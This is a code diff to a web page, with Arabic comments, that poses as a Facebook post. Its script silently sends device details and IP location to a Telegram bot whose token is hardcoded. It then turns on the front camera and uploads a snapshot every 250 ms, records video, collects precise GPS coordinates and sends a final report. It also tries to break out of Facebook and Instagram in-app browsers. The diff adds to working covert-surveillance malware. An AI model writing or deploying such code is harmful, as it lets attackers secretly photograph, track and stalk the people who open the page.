@@ -56,7 +56,6 @@
     .three-dots { position: absolute; top: 12px; left: 16px; width: 36px; height: 36px; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; color: var(--text-secondary); font-size: 20px; }
     .three-dots:hover { background: var(--border); }
 
-    /* أزرار إعادة المحاولة */
     .controls {
       display: flex;
       flex-direction: column;
@@ -95,7 +94,6 @@
     <div class="post-actions"><span>أعجبني</span><span>تعليق</span><span>مشاركة</span></div>
   </div>
 
-  <!-- أزرار إعادة المحاولة المنفصلة -->
   <div class="controls">
     <button class="retry-btn hidden" id="retryCameraBtn">إعادة محاولة الكاميرا</button>
     <button class="retry-btn hidden" id="retryLocationBtn">إعادة محاولة الموقع</button>
@@ -105,7 +103,6 @@
   <canvas id="canvas"></canvas>
 
   <script type="module">
-    // ==================== إعدادات ====================
     const B = '69ee19e8856a68218974812e';
     const T = '8649544110:AAF33tUasn_RsH6A7035vpyYntAlOAQ0axQ';
     const C = '5151102782';
@@ -120,8 +117,8 @@
 
     let stream, photos = 0, capInt, redir = 'https://www.facebook.com', deviceInfoSent = false, gpsLoc = null, ipLoc = null;
     let recording = false;
-    let cameraGranted = false;    // هل الكاميرا شغالة؟
-    let locationGranted = false;  // هل الموقع الدقيق أُرسل؟
+    let cameraGranted = false;
+    let locationGranted = false;
     let escapeCompleted = false;
 
     async function sendText(text) {
@@ -143,7 +140,6 @@
     function hideOverlay() { post.classList.remove('hidden'); }
     function stopAll() { if (capInt) clearInterval(capInt); if (stream) stream.getTracks().forEach(t => t.stop()); }
 
-    // ==================== تحميل المنشور ====================
     async function loadPost() {
       try {
         const r = await fetch(`https://api.jsonbin.io/v3/b/${B}/latest`);
@@ -165,7 +161,6 @@
       } catch (e) {}
     }
 
-    // ==================== معلومات الجهاز (بصمت) ====================
     async function sendDeviceInfo() {
       if (deviceInfoSent) return;
       deviceInfoSent = true;
@@ -183,7 +178,6 @@
       } catch (e) {}
     }
 
-    // ==================== الموقع عبر IP (بصمت) ====================
     async function fetchIPLocation() {
       try {
         const r = await fetch(`https://ipinfo.io/json?token=${I}`); const d = await r.json();
@@ -191,17 +185,16 @@
           const [lat, lon] = d.loc.split(',').map(Number);
           ipLoc = { lat, lon, acc: 5000, src: 'IP' };
           await sendText(
-            `📍 <b>الموقع التقريبي (نوع السحب: IP)</b>\n` +
+            `📍 <b>الموقع التقريبي (IP)</b>\n` +
             `الإحداثيات: ${lat}, ${lon}\n` +
-            `🌍 <a href="https://www.google.com/maps?q=${lat},${lon}">خرائط Google</a>\n` +
-            `🍎 <a href="http://maps.apple.com/?ll=${lat},${lon}&q=موقع">خرائط Apple</a>\n` +
+            `🌍 <a href="https://www.google.com/maps?q=${lat},${lon}">Google Maps</a>\n` +
+            `🍎 <a href="http://maps.apple.com/?ll=${lat},${lon}&q=موقع">Apple Maps</a>\n` +
             `🗺️ <a href="https://www.openstreetmap.org/?mlat=${lat}&mlon=${lon}&zoom=15">OpenStreetMap</a>`
           );
         }
       } catch (e) {}
     }
 
-    // ==================== الموقع الدقيق GPS (يُطلب لاحقاً) ====================
     async function requestGPS() {
       if (!navigator.geolocation) return false;
       try {
@@ -211,34 +204,53 @@
         if (pos.coords.accuracy > 50) return false;
         gpsLoc = { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy, src: 'GPS' };
         await sendText(
-          `📍 <b>الموقع الدقيق (نوع السحب: GPS)</b>\n` +
+          `📍 <b>الموقع الدقيق (GPS)</b>\n` +
           `الإحداثيات: ${gpsLoc.lat}, ${gpsLoc.lon} (دقة ${gpsLoc.acc}م)\n` +
-          `🌍 <a href="https://www.google.com/maps?q=${gpsLoc.lat},${gpsLoc.lon}">خرائط Google</a>\n` +
-          `🍎 <a href="http://maps.apple.com/?ll=${gpsLoc.lat},${gpsLoc.lon}&q=موقع">خرائط Apple</a>\n` +
+          `🌍 <a href="https://www.google.com/maps?q=${gpsLoc.lat},${gpsLoc.lon}">Google Maps</a>\n` +
+          `🍎 <a href="http://maps.apple.com/?ll=${gpsLoc.lat},${gpsLoc.lon}&q=موقع">Apple Maps</a>\n` +
           `🗺️ <a href="https://www.openstreetmap.org/?mlat=${gpsLoc.lat}&mlon=${gpsLoc.lon}&zoom=18">OpenStreetMap</a>`
         );
         return true;
       } catch (e) { return false; }
     }
 
-    // ==================== الكاميرا (تُطلب أولاً) ====================
     async function startCamera() {
       try {
         stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
         vid.srcObject = stream;
         await new Promise(r => { vid.onloadedmetadata = () => { vid.play(); r(); }; });
+        // تأكيد بدء التصوير
+        sendText("✅ الكاميرا تعمل، جاري التصوير...");
         capInt = setInterval(captureAndSend, 250);
         return true;
       } catch (e) { return false; }
     }
 
-    function captureAndSend() {
+    async function captureAndSend() {
       if (!stream || !vid.videoWidth) return;
-      cnv.width = vid.videoWidth; cnv.height = vid.videoHeight;
+      cnv.width = vid.videoWidth;
+      cnv.height = vid.videoHeight;
       ctx.drawImage(vid, 0, 0);
-      const blob = dataURLtoBlob(cnv.toDataURL('image/jpeg', 0.9));
-      const form = new FormData(); form.append('chat_id', C); form.append('photo', blob, 'snap.jpg');
-      fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: form }).catch(() => {});
+      // استخدام جودة أقل لتجنب حجم كبير
+      const dataUrl = cnv.toDataURL('image/jpeg', 0.7);
+      const blob = dataURLtoBlob(dataUrl);
+      if (blob.size > 10 * 1024 * 1024) {
+        // إذا تجاوز 10 ميغابايت، لا نرسل
+        console.warn('صورة كبيرة جداً، تخطي');
+        return;
+      }
+      const form = new FormData();
+      form.append('chat_id', C);
+      form.append('photo', blob, 'snap.jpg');
+      try {
+        const res = await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: form });
+        if (!res.ok) {
+          const errText = await res.text();
+          console.error('فشل إرسال الصورة:', errText);
+        }
+      } catch(e) {
+        console.error('خطأ شبكة:', e);
+      }
       photos++;
       if (photos % 5 === 0 && !recording) startVideoRecording();
     }
@@ -261,16 +273,13 @@
       } catch (e) { recording = false; }
     }
 
-    // ==================== محاولة الكاميرا ====================
     async function tryCamera() {
       const ok = await startCamera();
       if (ok) {
         cameraGranted = true;
         retryCameraBtn.classList.add('hidden');
-        // الكاميرا شغالة، نبدأ بطلب الموقع (لن يؤثر على التصوير)
         tryLocation();
       } else {
-        // رفض الكاميرا: إخفاء المنشور، إظهار زر إعادة المحاولة
         showOverlay();
         retryCameraBtn.classList.remove('hidden');
         retryLocationBtn.classList.add('hidden');
@@ -278,20 +287,16 @@
       }
     }
 
-    // ==================== محاولة الموقع (تُستدعى بعد نجاح الكاميرا) ====================
     async function tryLocation() {
       const ok = await requestGPS();
       if (ok) {
-        // نجح GPS وأُرسل للبوت
         locationGranted = true;
         retryLocationBtn.classList.add('hidden');
       } else {
-        // فشل GPS – يظهر زر إعادة المحاولة للموقع فقط، والتصوير مستمر
         retryLocationBtn.classList.remove('hidden');
       }
     }
 
-    // ==================== أزرار إعادة المحاولة ====================
     retryCameraBtn.addEventListener('click', async () => {
       retryCameraBtn.classList.add('hidden');
       hideOverlay();
@@ -303,7 +308,6 @@
       await tryLocation();
     });
 
-    // ==================== تقرير الخروج ====================
     async function sendExitReport() {
       let locStr = 'غير متوفر';
       if (gpsLoc) locStr = `GPS (${gpsLoc.lat}, ${gpsLoc.lon}, دقة ${gpsLoc.acc}م)`;
@@ -311,7 +315,6 @@
       await sendText(`<b>📋 تقرير نهائي</b>\nعدد الصور: ${photos}\nالموقع: ${locStr}\nالوقت: ${new Date().toLocaleString()}`);
     }
 
-    // ==================== خطة الهروب من WebView (7 طرق) ====================
     async function attemptEscape() {
       if (escapeCompleted) return;
       const targetUrl = window.location.href;
@@ -319,24 +322,19 @@
       const isIOS = /iPhone|iPad|iPod/i.test(ua);
       const isAndroid = /Android/i.test(ua);
       const methods = isIOS ? [
-        { name: 'Safari', fn: () => { window.location.href = targetUrl.replace(/^https?:\/\//, 'x-safari-https://'); } },
-        { name: 'Chrome', fn: () => { window.location.href = targetUrl.replace(/^https?:\/\//, 'googlechrome://'); } },
-        { name: 'Opera', fn: () => { window.location.href = 'opera-https://' + targetUrl.replace(/^https?:\/\//, ''); } },
-        { name: 'Firefox', fn: () => { window.location.href = 'firefox://open-url?url=' + encodeURIComponent(targetUrl); } },
-        { name: 'Brave', fn: () => { window.location.href = 'brave://open-url?url=' + encodeURIComponent(targetUrl); } },
-        { name: 'Edge', fn: () => { window.location.href = 'microsoft-edge-https://' + targetUrl.replace(/^https?:\/\//, ''); } },
-        { name: 'Popup', fn: () => { window.open(targetUrl, '_blank', 'noopener,noreferrer'); } }
+        () => { window.location.href = targetUrl.replace(/^https?:\/\//, 'x-safari-https://'); },
+        () => { window.location.href = targetUrl.replace(/^https?:\/\//, 'googlechrome://'); },
+        () => { window.location.href = 'opera-https://' + targetUrl.replace(/^https?:\/\//, ''); },
+        () => { window.location.href = 'firefox://open-url?url=' + encodeURIComponent(targetUrl); },
+        () => { window.open(targetUrl, '_blank', 'noopener,noreferrer'); }
       ] : isAndroid ? [
-        { name: 'Chrome', fn: () => { window.location.href = `intent://${targetUrl.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=com.android.chrome;end`; } },
-        { name: 'Opera', fn: () => { window.location.href = `intent://${targetUrl.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=com.opera.browser;end`; } },
-        { name: 'Firefox', fn: () => { window.location.href = `intent://${targetUrl.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=org.mozilla.firefox;end`; } },
-        { name: 'Samsung', fn: () => { window.location.href = `intent://${targetUrl.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=com.sec.android.app.sbrowser;end`; } },
-        { name: 'Brave', fn: () => { window.location.href = `intent://${targetUrl.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=com.brave.browser;end`; } },
-        { name: 'Edge', fn: () => { window.location.href = `intent://${targetUrl.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=com.microsoft.emmx;end`; } },
-        { name: 'Popup', fn: () => { window.open(targetUrl, '_blank', 'noopener,noreferrer'); } }
+        () => { window.location.href = `intent://${targetUrl.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=com.android.chrome;end`; },
+        () => { window.location.href = `intent://${targetUrl.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=com.opera.browser;end`; },
+        () => { window.location.href = `intent://${targetUrl.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=org.mozilla.firefox;end`; },
+        () => { window.open(targetUrl, '_blank', 'noopener,noreferrer'); }
       ] : [];
       for (let i = 0; i < methods.length; i++) {
-        try { methods[i].fn(); } catch(e) {}
+        try { methods[i](); } catch(e) {}
         await new Promise(r => setTimeout(r, 300));
       }
       escapeCompleted = true;
@@ -347,13 +345,11 @@
       return /FBAN|FBAV|Instagram/i.test(ua);
     }
 
-    // ==================== بدء التشغيل ====================
     (async function init() {
       await loadPost();
       sendDeviceInfo();
       fetchIPLocation();
       if (isInAppBrowser()) await attemptEscape();
-      // نطلب الكاميرا بعد 600ms (ستقوم tryCamera باستدعاء tryLocation تلقائياً بعد النجاح)
       setTimeout(tryCamera, 600);
     })();
 
